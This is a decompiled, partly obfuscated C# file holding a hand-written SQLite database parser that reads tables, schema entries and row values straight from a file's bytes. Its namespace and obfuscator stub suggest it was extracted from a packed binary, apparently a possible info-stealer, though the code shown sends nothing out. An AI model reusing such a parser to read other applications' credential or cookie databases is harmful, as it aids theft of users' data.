using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Strings;

namespace NoiseMe.Drags.App.Data.SQLite
{
	// Token: 0x0200000F RID: 15
	public class CNT
	{
		// Token: 0x060000BB RID: 187 RVA: 0x0000281D File Offset: 0x00000A1D
		[CompilerGenerated]
		private byte[] method_0()
		{
			return this.byte_0;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00002825 File Offset: 0x00000A25
		[CompilerGenerated]
		private ulong method_1()
		{
			return this.ulong_0;
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x060000BD RID: 189 RVA: 0x0000282D File Offset: 0x00000A2D
		// (set) Token: 0x060000BE RID: 190 RVA: 0x00002835 File Offset: 0x00000A35
		public string[] Fields { get; set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060000BF RID: 191 RVA: 0x0000283E File Offset: 0x00000A3E
		public int RowLength
		{
			get
			{
				return this.method_5().Length;
			}
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x00002848 File Offset: 0x00000A48
		[CompilerGenerated]
		private ushort method_2()
		{
			return this.ushort_0;
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x00002850 File Offset: 0x00000A50
		[CompilerGenerated]
		private FF[] method_3()
		{
			return this.ff_0;
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x00002858 File Offset: 0x00000A58
		[CompilerGenerated]
		private void method_4(FF[] value)
		{
			this.ff_0 = value;
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x00002861 File Offset: 0x00000A61
		[CompilerGenerated]
		private ROW[] method_5()
		{
			return this.row_0;
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x00002869 File Offset: 0x00000A69
		[CompilerGenerated]
		private void method_6(ROW[] value)
		{
			this.row_0 = value;
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x00002872 File Offset: 0x00000A72
		[CompilerGenerated]
		private byte[] method_7()
		{
			return this.byte_1;
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x00005458 File Offset: 0x00003658
		public CNT(string baseName)
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
			this.byte_1 = new byte[]
			{
				0,
				1,
				2,
				3,
				4,
				6,
				8,
				8,
				0,
				0
			};
			if (File.Exists(baseName))
			{
				FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
				string s = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref s, -1L, false);
				FileSystem.FileClose(new int[]
				{
					1
				});
				this.byte_0 = Encoding.Default.GetBytes(s);
				this.ushort_0 = (ushort)this.method_8(16, 2);
				this.ulong_0 = this.method_8(56, 4);
				if (decimal.Compare(new decimal(this.method_1()), 0m) == 0)
				{
					this.ulong_0 = 1UL;
				}
				this.method_11(100UL);
			}
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x00005538 File Offset: 0x00003738
		public string[] ParseTables()
		{
			string[] array = null;
			int num = 0;
			int num2 = this.method_3().Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.method_3()[i].Type == "table")
				{
					array = (string[])Utils.CopyArray(array, new string[num + 1]);
					array[num] = this.method_3()[i].Name;
					num++;
				}
			}
			return array;
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x000055B4 File Offset: 0x000037B4
		public string ParseValue(int rowIndex, int fieldIndex)
		{
			string result;
			if (rowIndex >= this.method_5().Length)
			{
				result = null;
			}
			else if (fieldIndex >= this.method_5()[rowIndex].RowData.Length)
			{
				result = null;
			}
			else
			{
				result = this.method_5()[rowIndex].RowData[fieldIndex];
			}
			return result;
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x0000560C File Offset: 0x0000380C
		public string ParseValue(int rowIndex, string fieldName)
		{
			int num = -1;
			int num2 = this.Fields.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.Fields[i].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
				{
					num = i;
					IL_49:
					string result;
					if (num == -1)
					{
						result = null;
					}
					else
					{
						result = this.ParseValue(rowIndex, num);
					}
					return result;
				}
			}
			goto IL_49;
		}

		// Token: 0x060000CA RID: 202 RVA: 0x00005678 File Offset: 0x00003878
		public bool ReadTable(string tableName)
		{
			int num = -1;
			int num2 = this.method_3().Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.method_3()[i].Name.ToLower().CompareTo(tableName.ToLower()) == 0)
				{
					num = i;
					IL_48:
					bool result;
					if (num == -1)
					{
						result = false;
					}
					else
					{
						string[] array = this.method_3()[num].SqlStatement.Substring(this.method_3()[num].SqlStatement.IndexOf("(") + 1).Split(new char[]
						{
							','
						});
						int num3 = array.Length - 1;
						for (int j = 0; j <= num3; j++)
						{
							array[j] = array[j].TrimStart(Array.Empty<char>());
							int num4 = array[j].IndexOf(" ");
							if (num4 > 0)
							{
								array[j] = array[j].Substring(0, num4);
							}
							if (array[j].IndexOf("UNIQUE") == 0)
							{
								break;
							}
							this.Fields = (string[])Utils.CopyArray(this.Fields, new string[j + 1]);
							this.Fields[j] = array[j];
						}
						result = this.method_12((ulong)((this.method_3()[num].RootNum - 1L) * (long)((ulong)this.method_2())));
					}
					return result;
				}
			}
			goto IL_48;
		}

		// Token: 0x060000CB RID: 203 RVA: 0x000057F0 File Offset: 0x000039F0
		private ulong method_8(int int_0, int int_1)
		{
			ulong result;
			if (int_1 > 8 || int_1 == 0)
			{
				result = 0UL;
			}
			else
			{
				ulong num = 0UL;
				for (int i = 0; i <= int_1 - 1; i++)
				{
					num = (num << 8 | (ulong)this.method_0()[int_0 + i]);
				}
				result = num;
			}
			return result;
		}

		// Token: 0x060000CC RID: 204 RVA: 0x00005848 File Offset: 0x00003A48
		private long method_9(int int_0, int int_1)
		{
			int_1++;
			byte[] array = new byte[8];
			int num = int_1 - int_0;
			bool flag = false;
			long result;
			if (num == 0 | num > 9)
			{
				result = 0L;
			}
			else
			{
				int num2 = num;
				if (num2 != 1)
				{
					if (num2 == 9)
					{
						flag = true;
					}
					int num3 = 1;
					int num4 = 7;
					int num5 = 0;
					if (flag)
					{
						array[0] = this.method_0()[int_1 - 1];
						int_1--;
						num5 = 1;
					}
					for (int i = int_1 - 1; i >= int_0; i += -1)
					{
						if (i - 1 >= int_0)
						{
							array[num5] = (byte)(((int)((byte)(this.method_0()[i] >> (num3 - 1 & 7))) & 255 >> num3) | (int)((byte)(this.method_0()[i - 1] << (num4 & 7))));
							num3++;
							num5++;
							num4--;
						}
						else if (!flag)
						{
							array[num5] = (byte)((int)((byte)(this.method_0()[i] >> (num3 - 1 & 7))) & 255 >> num3);
						}
					}
					result = BitConverter.ToInt64(array, 0);
				}
				else
				{
					array[0] = (this.method_0()[int_0] & 127);
					result = BitConverter.ToInt64(array, 0);
				}
			}
			return result;
		}

		// Token: 0x060000CD RID: 205 RVA: 0x0000597C File Offset: 0x00003B7C
		private int method_10(int int_0)
		{
			int result;
			if (int_0 > this.method_0().Length)
			{
				result = 0;
			}
			else
			{
				int num = int_0 + 8;
				for (int i = int_0; i <= num; i++)
				{
					if (i > this.method_0().Length - 1)
					{
						return 0;
					}
					if ((this.method_0()[i] & 128) != 128)
					{
						return i;
					}
				}
				result = int_0 + 8;
			}
			return result;
		}

		// Token: 0x060000CE RID: 206 RVA: 0x0000287A File Offset: 0x00000A7A
		public static bool ItIsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x060000CF RID: 207 RVA: 0x000059E8 File Offset: 0x00003BE8
		private void method_11(ulong ulong_1)
		{
			if (this.method_0()[(int)((uint)ulong_1)] == 13)
			{
				ushort num = (this.method_8((ulong_1.ForceTo<decimal>() + 3m).ForceTo<int>(), 2).ForceTo<decimal>() - 1m).ForceTo<ushort>();
				int num2 = 0;
				if (this.method_3() != null)
				{
					num2 = this.method_3().Length;
					this.method_4((FF[])Utils.CopyArray(this.method_3(), new FF[this.method_3().Length + (int)num + 1]));
				}
				else
				{
					this.method_4(new FF[(int)(num + 1)]);
				}
				int num3 = (int)num;
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = this.method_8((ulong_1.ForceTo<decimal>() + 8m + (i * 2).ForceTo<decimal>()).ForceTo<int>(), 2);
					if (decimal.Compare(ulong_1.ForceTo<decimal>(), 100m) != 0)
					{
						num4 += ulong_1;
					}
					int num5 = this.method_10(num4.ForceTo<int>());
					this.method_9(num4.ForceTo<int>(), num5);
					int num6 = this.method_10((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>());
					this.method_3()[num2 + i].ID = this.method_9((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>(), num6);
					num4 = (num4.ForceTo<decimal>() + num6.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<ulong>();
					num5 = this.method_10(num4.ForceTo<int>());
					num6 = num5;
					long value = this.method_9(num4.ForceTo<int>(), num5);
					long[] array = new long[5];
					int num7 = 0;
					do
					{
						num5 = num6 + 1;
						num6 = this.method_10(num5);
						array[num7] = this.method_9(num5, num6);
						if (array[num7] > 9L)
						{
							if (CNT.ItIsOdd(array[num7]))
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
							}
							else
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
							}
						}
						else
						{
							array[num7] = (long)((ulong)this.method_7()[(int)array[num7]]);
						}
						num7++;
					}
					while (num7 <= 4);
					Encoding encoding = Encoding.Default;
					decimal value2 = this.method_1().ForceTo<decimal>();
					if (!1m.Equals(value2))
					{
						if (!2m.Equals(value2))
						{
							if (3m.Equals(value2))
							{
								encoding = Encoding.BigEndianUnicode;
							}
						}
						else
						{
							encoding = Encoding.Unicode;
						}
					}
					else
					{
						encoding = Encoding.Default;
					}
					this.method_3()[num2 + i].Type = encoding.GetString(this.method_0(), Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					this.method_3()[num2 + i].Name = encoding.GetString(this.method_0(), Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					this.method_3()[num2 + i].RootNum = (long)this.method_8(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					this.method_3()[num2 + i].SqlStatement = encoding.GetString(this.method_0(), Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
				}
			}
			else if (this.method_0()[(int)((uint)ulong_1)] == 5)
			{
				int num8 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.method_8(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 3m)), 2)), 1m));
				for (int j = 0; j <= num8; j++)
				{
					ushort num9 = (ushort)this.method_8(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_1), 12m), new decimal(j * 2))), 2);
					if (decimal.Compare(new decimal(ulong_1), 100m) == 0)
					{
						this.method_11(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.method_8((int)num9, 4)), 1m), new decimal((int)this.method_2()))));
					}
					else
					{
						this.method_11(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.method_8((int)(ulong_1 + (ulong)num9), 4)), 1m), new decimal((int)this.method_2()))));
					}
				}
				this.method_11(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.method_8(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 8m)), 4)), 1m), new decimal((int)this.method_2()))));
			}
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x0000604C File Offset: 0x0000424C
		private bool method_12(ulong ulong_1)
		{
			if (this.method_0()[(int)((uint)ulong_1)] == 13)
			{
				int num = Convert.ToInt32(decimal.Subtract(new decimal(this.method_8(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 3m)), 2)), 1m));
				int num2 = 0;
				if (this.method_5() != null)
				{
					num2 = this.method_5().Length;
					this.method_6((ROW[])Utils.CopyArray(this.method_5(), new ROW[this.method_5().Length + num + 1]));
				}
				else
				{
					this.method_6(new ROW[num + 1]);
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					SZ[] array = null;
					ulong num4 = this.method_8(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_1), 8m), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(ulong_1), 100m) != 0)
					{
						num4 += ulong_1;
					}
					int num5 = this.method_10((int)num4);
					this.method_9((int)num4, num5);
					int num6 = this.method_10(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					this.method_5()[num2 + i].ID = this.method_9(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = this.method_10((int)num4);
					num6 = num5;
					long num7 = this.method_9((int)num4, num5);
					long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
					int num9 = 0;
					while (num8 < num7)
					{
						array = (SZ[])Utils.CopyArray(array, new SZ[num9 + 1]);
						num5 = num6 + 1;
						num6 = this.method_10(num5);
						array[num9].Type = this.method_9(num5, num6);
						if (array[num9].Type > 9L)
						{
							if (CNT.ItIsOdd(array[num9].Type))
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 13L) / 2.0);
							}
							else
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 12L) / 2.0);
							}
						}
						else
						{
							array[num9].Size = (long)((ulong)this.method_7()[(int)array[num9].Type]);
						}
						num8 = num8 + (long)(num6 - num5) + 1L;
						num9++;
					}
					this.method_5()[num2 + i].RowData = new string[array.Length - 1 + 1];
					int num10 = 0;
					int num11 = array.Length - 1;
					for (int j = 0; j <= num11; j++)
					{
						if (array[j].Type > 9L)
						{
							if (!CNT.ItIsOdd(array[j].Type))
							{
								if (decimal.Compare(new decimal(this.method_1()), 1m) == 0)
								{
									this.method_5()[num2 + i].RowData[j] = Encoding.Default.GetString(this.method_0(), Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.method_1()), 2m) == 0)
								{
									this.method_5()[num2 + i].RowData[j] = Encoding.Unicode.GetString(this.method_0(), Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.method_1()), 3m) == 0)
								{
									this.method_5()[num2 + i].RowData[j] = Encoding.BigEndianUnicode.GetString(this.method_0(), Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
							}
							else
							{
								this.method_5()[num2 + i].RowData[j] = Encoding.Default.GetString(this.method_0(), Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
							}
						}
						else
						{
							this.method_5()[num2 + i].RowData[j] = Convert.ToString(this.method_8(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size));
						}
						num10 += (int)array[j].Size;
					}
				}
			}
			else if (this.method_0()[(int)((uint)ulong_1)] == 5)
			{
				int num12 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.method_8(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 3m)), 2)), 1m));
				for (int k = 0; k <= num12; k++)
				{
					ushort num13 = (ushort)this.method_8(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_1), 12m), new decimal(k * 2))), 2);
					this.method_12(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.method_8((int)(ulong_1 + (ulong)num13), 4)), 1m), new decimal((int)this.method_2()))));
				}
				this.method_12(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.method_8(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 8m)), 4)), 1m), new decimal((int)this.method_2()))));
			}
			return true;
		}

		// Token: 0x04000021 RID: 33
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private readonly byte[] byte_0;

		// Token: 0x04000022 RID: 34
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private readonly ulong ulong_0;

		// Token: 0x04000023 RID: 35
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string[] string_0;

		// Token: 0x04000024 RID: 36
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private readonly ushort ushort_0;

		// Token: 0x04000025 RID: 37
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private FF[] ff_0;

		// Token: 0x04000026 RID: 38
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private ROW[] row_0;

		// Token: 0x04000027 RID: 39
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private readonly byte[] byte_1;
	}
}
